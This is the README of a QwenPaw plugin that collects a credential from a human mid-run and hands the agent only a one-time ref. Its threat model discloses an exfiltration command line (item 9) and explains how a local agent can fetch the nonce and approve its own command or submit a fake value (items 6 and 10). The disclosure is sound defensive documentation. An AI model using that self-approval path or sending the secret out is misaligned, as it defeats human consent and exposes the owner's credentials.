# secret-input

A QwenPaw backend plugin for asking the human for a secret **in the middle of a run**,
without putting the secret into the model's context.

English | [中文版](README.zh-CN.md)

Your agent needs a credential to finish a task — push a fix, call an API, sign a
request. You do **not** want that credential in the chat history, the model's
context, or the host's logs. This plugin is the channel for it: the human types it
into a private card, and the model only ever receives a one-time `ref`.

**The value never enters the model's context; the model only ever receives a one-time ref.**

## Requirements

- QwenPaw **≥ 2.1.0, < 2.99.0** (the host this plugin loads into), with its bundled
  Python 3.12 interpreter.

## Quick start

1. Install it (below) and enable the three tools in your agent's tool settings.
2. Ask the model: *"用 request_secret 向我要一个 GitHub token（label=GitHub token,
   reason=push the fix），拿到 ref 后用 secret_exec 跑 git push。"*
3. When the card appears (overlay, bottom-right — or the standalone answer page),
   type the secret and submit. The model gets `{"status":"saved","ref":"sr_…"}`.
4. When it calls `secret_exec`, a second card shows the **exact command**; approve
   it and the command runs, with every occurrence of the value coming back as
   `***`.

## What it does

The model calls `request_secret`; a private card appears in the session (and at a
self-contained answer page); the human types the value; the model receives a
one-time `ref`, never the value.

The plugin keeps the plaintext in memory only (never on disk), substitutes it
in-process for `secret_exec`, and scrubs any occurrence of it out of tool output
as `***`. `secret_export` is the single, deliberate exception: it persists the
value into the host's encrypted env store so later shell tools can use
`$ENV_KEY`.

Before either consuming tool spends a ref, a **confirmation card** shows the
exact action — the full command and working directory for `secret_exec`, the env
name for `secret_export` — and waits for a human to approve or decline. The host
does **not** gate plugin tools (measured on QwenPaw 2.2.2: `/api/approval/list`
stayed empty while `secret_exec` ran), so this gate is the plugin's own. It is
consent and visibility, **not a sandbox**: the same loopback caller can fetch the
nonce and approve its own command (threat model item 10).

- Three tools: `request_secret`, `secret_exec`, `secret_export`
- Four HTTP endpoints under `/api/secret-input` (loopback or authenticated caller)
- One block-time overlay card + one standalone answer page (both render secret
  cards and confirmation cards)
- One middleware that rewrites tool results before they reach the transcript, memory,
  or the disk-offload path

## Install

### QwenPaw is running (hot install, no restart)

```bash
qwenpaw plugin install /path/to/secret_input --force
# or, same route the desktop uses:
curl -s -X POST http://127.0.0.1:19999/api/plugins/install \
  -H 'Content-Type: application/json' \
  -d '{"source":"/path/to/secret_input","force":true}'
```

The startup hook runs immediately (the `secret-input: swept ...` line appears in
the host log); no restart is required.

### QwenPaw is stopped

`qwenpaw plugin install <directory>` or `qwenpaw plugin install <https URL to a zip>`
work. A **local zip file** is rejected with `plugin.json not found` in this mode —
use the directory, or host the zip and pass its URL.

### From a release

Download the zip from the [latest release](https://github.com/CallMeHFK/qwenpaw-secret-input/releases/latest)
(built by `packaging/build_zip.sh`; the archive has a single top-level
`secret-input/` directory plus the READMEs and LICENSE) and install it as above.

## Enable the tools

All three tools register disabled (`enabled=False`). Turn them on in the agent's tool settings before use.

Uninstalling the plugin **clears those `builtin_tools` entries in every agent**
(the host logs `Removed tools [...] from agents.tools`), so the toggles you turned
on are lost; a reinstall writes them back as `enabled=False` and you have to
enable them again.

Hot install also syncs the tools listed in `plugin.json` → `meta.tools[]` into
every agent's `builtin_tools`; if you add a fourth tool, add it there too or it
will stay invisible in `/api/tools` until the host restarts.

`/api/tools` reads that agent config, not the runtime registration, so a tool can
be listed there and still be uncallable (and entries created by the sync keep an
empty description and the default icon). The authoritative hot-install evidence
is in `~/.qwenpaw/qwenpaw.log`: `Attached ToolDescriptor to '<name>'` plus
`Injected '<name>' into workspace '<agent>' ToolRegistry`, and no
`Failed to register tool ... (rolled back)`.

## Usage

A typical exchange:

```text
model → request_secret(label="GitHub token", reason="push the fix")
        (blocks; the human fills the card)
tool  ← {"status": "saved", "ref": "sr_…", "ref_expires_in": 300,
         "hint": "Pass ref to secret_exec or secret_export. You never see the value."}

model → secret_exec(ref="sr_…", command='curl -H "Authorization: Bearer $SECRET" …')
        (blocks; the confirmation card shows the exact command and cwd)
tool  ← {"status": "ok", "exit_code": 0, "stdout": "…", "stderr": "", "ref": "consumed"}
```

Prefer `$SECRET` (or your own `env_name`) over the `{{secret}}` marker inside a
command line — see the `argv` caveat under [Threat model](#threat-model).

### Spending a ref needs a human decision

`secret_exec` and `secret_export` do not consume a ref on their own. Before they
do, they open a confirmation card:

- The card shows the **complete** command text (control and bidi characters are
  escaped as `\uXXXX`, so the card cannot hide terminal escapes or reorder the
  text) plus `cwd` and `env_name`; `secret_export` shows `env_key` instead of a
  command. `{{secret}}` stays visible as a placeholder and is substituted only
  at execution.
- Commands longer than 4000 characters are refused before the card is created
  (`status: "error"`, ref **not** consumed) — the plugin will not ask a human to
  approve a tail they cannot see.
- On approval the ref is consumed and the action proceeds, exactly once.
- On `declined`, `timed_out` or `cancelled` the result is
  `{"status": …, "ref": "not_consumed", …}`: the ref is still payable, but only
  for a **different** action. Do not retry the command the human just denied.
- If the ref expired or was spent while the card was open, the terminal status is
  the usual `ref_expired` / `ref_unavailable`.

Set `require_consume_approval=false` to restore the direct path (the tool spends
the ref and runs immediately). Only do that in an environment where every
`secret_exec` command is already reviewed elsewhere.

`request_secret` arguments: `label`, `reason`, `placeholder`, `timeout_seconds`,
`client_request_id`.

- `timeout_seconds` omitted or `0` means "use the operator's
  `answer_timeout_seconds` (default 600)". It is **not** "time out immediately".
  An explicit value must be in `30..3600` and wins over the config.
- Reuse the same `client_request_id` when retrying a call whose result was lost
  (idempotent replay). Use a **new** one after `timed_out` / `ref_unavailable` /
  `ref_expired`.

`request_secret` outcomes you must handle:

| status | meaning | what to do |
| --- | --- | --- |
| `saved` | human answered; `ref` is valid once | spend it with `secret_exec`/`secret_export` |
| `declined` | human refused | do not ask again for the same thing |
| `timed_out` | nobody answered before the deadline | ask again with `request_secret` and a **new** `client_request_id` |
| `cancelled` | the run was stopped while the card was open | stop; do not retry blindly |
| `ref_unavailable` | ref already spent or unknown | ask again with a **new** `client_request_id` |
| `ref_expired` | ref outlived `ref_ttl_seconds` | ask again with a **new** `client_request_id` |

`secret_exec`: once the human approves the command (see above), the value is
exported to `$<env_name>` (default `SECRET`) for the child, and a `{{secret}}`
marker in the command text is substituted in-process.
**Prefer `$<env_name>`**: the substituted command becomes the child's `argv`, and
`/proc/<pid>/cmdline` is world-readable (mode `0444`) for the child's whole
lifetime — it also lands in `ps` output, auditd `EXECVE` records and process
accounting. Reading the value from the environment keeps it out of all of those.
`stdout`/`stderr` pass through the scrubber (`***`) and share one
`max_output_bytes` budget (default 32768, range 1024..32768). The marker is
reserved inside the budget, so the serialized result stays under the host's
50 000 B disk-offload threshold.

`secret_export`: `env_key` must match `^[A-Z_][A-Z0-9_]{0,63}$` and must not be a
host-critical name (`PATH`, `HOME`, `LD_PRELOAD`, `NODE_OPTIONS`,
`GIT_SSH_COMMAND`, `PYTHONSTARTUP`, … — 20 names in total). After the human
approves, the value goes into the host's encrypted env store and the process
environment, for later `$ENV_KEY` use; the ref is consumed only if the write
succeeds. **Prefer `secret_exec` for one-shot use** — export is a persistent
exposure by design. That denylist is a guard against accidentally bricking or
persistently hijacking the host, **not a security boundary**: the model already
has arbitrary execution through `secret_exec`, so "not on the list" never means
"safe".

## Where the answer can be given

1. **Overlay card** in the Console session (appears while the tool is blocked;
   polls the plugin every 2 s for this session's pending requests). It renders
   **one card at a time** — the first pending request for this session; if
   several are open, answer one and the next appears within 2 s. The same card
   component renders secret requests and confirmation requests; a confirmation
   card hides the value input and shows the action instead.
2. **Standalone answer page** at `/api/secret-input/card/<request_id>` — no CDN,
   no build, works in a plain browser tab. For a confirmation it shows the same
   exact command/env key and offers approve/decline.
3. **Terminal fallback**:

```bash
curl -s http://127.0.0.1:19999/api/secret-input/pending \
  | jq -r '.requests[].answer_url'
```

The `nonce` is only handed out by `GET /card/<id>/meta` while the card is still
pending; it is never in `/pending` and never in the tool result.

## Threat model

1. **Same-host process isolation does not exist.** The host agent can run
   `execute_shell_command` as the same uid, read the host env store, and
   `printenv`. Scrubbing is **best-effort, not a sandbox**: encoded, split, or
   rewritten values (`echo ${TOKEN:0:4}`) are not caught.
2. **`secret_export` is a designed exposure.** The value stays in the host env
   store and process environment long after the run. Use `secret_exec` when you
   only need it once.
3. Python strings cannot be zeroed; memory forensics is out of scope. TTLs only
   shrink the window.
4. **Card text is written by the model.** `label`/`reason` are rendered as
   untrusted text (no HTML, no links), but they can still carry prompt-injection
   bait aimed at the human.
5. **Host auth off + `0.0.0.0`** means the LAN can read `/api/*`; this plugin's
   loopback gate covers only its own four endpoints and does not change the
   host's global policy. `allow_remote=true` opens them further (and also
   short-circuits the bare `/pending` loopback-only rule).
6. **Your local agent can answer the card before you do.** The agent can call
   `GET /card/{id}/meta` from loopback, obtain the nonce, and submit a value it
   invented. It still cannot read a value it never knew, but it can make the
   plugin store a fake one. The plugin records and shows the answering peer and
   timestamp ("answered by `<peer>` at `<time>`") so you can notice
   it; **when asking for a high-value credential, be present and check the card
   after submitting.**
7. **`{{secret}}` in a command line puts the value in `argv`.**
   `/proc/<pid>/cmdline` is world-readable (mode `0444`) for the child's whole
   lifetime, and the same text also shows up in `ps` output, auditd `EXECVE`
   records and process accounting — strictly *wider* than item 1's "same uid".
   Prefer `$<env_name>`: then the value travels in the child's environment, which
   other local users cannot read.
8. **Values shorter than 8 characters get no egress scrubbing at all.**
   Registering them would `***`-spatter ordinary output, so the scrubber refuses
   them (`scrub.py` → `_MIN_VALUE_CHARS = 8`): a 6-character password reaches
   `stdout` verbatim and passes through the middleware untouched. Ask for values
   of 8+ characters, or treat a short secret as unscrubbed.
9. **`secret_exec` is an exfiltration primitive: the command is model-authored.**
   The model can point the value anywhere — `curl -d "$SECRET" https://…`, or
   redirect it into a file. Redirecting to a file and reading it with a *different*
   tool **is** covered: the scrub middleware is global (it rewrites every tool's
   result, not just this plugin's). But a **network send leaves the machine before
   any scrubbing can run** — the middleware cleans what the model *sees*, not what
   it *sends out*. This is inherent to a controlled executor: the value goes into a
   command, and the command is model-authored. Review the exact command before you
   let an agent spend a ref.
10. **The host does not gate plugin tools, and the confirmation card is not a
    sandbox.** On QwenPaw 2.2.2 (measured 2026-10-21) a model call to
    `secret_exec` ran without any host approval prompt — `/api/approval/list`
    stayed empty for the whole run. The plugin's confirmation card is the only
    gate, and it provides **consent and visibility, not a boundary**: the same
    loopback caller (the agent's shell included) can read `/pending`, fetch the
    nonce from `/card/{id}/meta`, and `POST /answer {"approve": true}` to approve
    its own command — the self-approval path from item 6 applies to confirmation
    cards too. It stops the model that did not realise it was sending a
    credential out, and it surfaces prompt-injected actions before they run; it
    does not stop an agent deliberately evading the human. Treat
    `require_consume_approval` as a seat belt, not a lock.

Scrubbing replaces every known variant (raw/base64/base64url/hex/percent) of a
registered value with exactly `***` — but only for values of **8 characters or
more** (item 8). The host's `mask_secret_value` is **not** used: it preserves
leading/trailing characters.

## Configuration

`api.config` is `{}` on hot install; every key has a default. Precedence:
`plugin.json meta.config` > `api.config` > `QWENPAW_SECRET_INPUT_*` env >
default.

| key | default | meaning |
| --- | --- | --- |
| `answer_timeout_seconds` | 600 | default wait for `request_secret` when `timeout_seconds` is omitted/0 |
| `ref_ttl_seconds` | 300 | how long a ref stays valid |
| `scrub_enabled` | true | output scrubbing (turn off = inbound-only guarantees) |
| `scrub_ttl_seconds` | 3600 | how long a value stays in the scrub set |
| `scrub_max_entries` | 64 | scrub set bound |
| `allow_remote` | false | accept non-loopback unauthenticated calls to the four endpoints |
| `public_base_url` | empty | prefix for the answer URL in the INFO log; empty = `http://127.0.0.1:19999`. The plugin cannot read the host's listen port in-process, so **set this key if the host listens elsewhere** or the logged link is dead. |
| `max_pending` | 32 | concurrent open cards |
| `require_consume_approval` | true | show a confirmation card with the exact command/env key before `secret_exec`/`secret_export` spend a ref. **Consent and visibility, not a sandbox** (threat model item 10). An unrecognised value (typo) falls back to `true`, not `false`. |

The loopback check matches the literal TCP peers `127.0.0.1` and `::1` only.
`request.client.host` is a socket address, so it can never be the string
`localhost` — such an entry would be dead, and a spoofable hole the day the host
enables proxy headers. `::ffff:127.0.0.1` (the IPv4-mapped shape a `::`-bound
host shows for loopback) is intentionally not matched either: it fails closed.
If your client connects from another loopback address (`127.0.0.2`, …), it is
rejected (fail-closed) — use `127.0.0.1`.

## Development

```bash
# tests + packaging verifier are run with the host interpreter
python3.12 -m unittest discover -s tests -t . -v
python3.12 -m compileall -q backend
python3.12 packaging/verify_qp_plugin.py .
python3.12 -m ruff check backend tests packaging
node --check ui/index.js          # or the nodejs binary on Debian-style hosts
bash packaging/build_zip.sh
```

- `packaging/verify_qp_plugin.py` runs the **real** `PluginLoader` offline. It is
  frozen evidence, not product code: `tests/test_verifier_gate.py` pins its
  sha256 (`2182bc4d…f18a`) and exercises its 8 negative controls plus a positive
  control, so editing it — or shipping a package it should reject — reddens the
  suite.
- Every gate is expected to have a **negative control** (delete the defence, watch
  the test go red). A gate that cannot fail is not a gate.
- Tests use obvious dummy values (`DUMMY-SK-abcdef123456`); never a real secret.
- The full `unittest` suite needs the host package (it imports `qwenpaw`), so CI
  runs only the static gates; run the full suite locally with the host
  interpreter.
- Building the release zip needs `python3`, `zip`, and `unzip`.

## License

MIT — see [LICENSE](LICENSE).
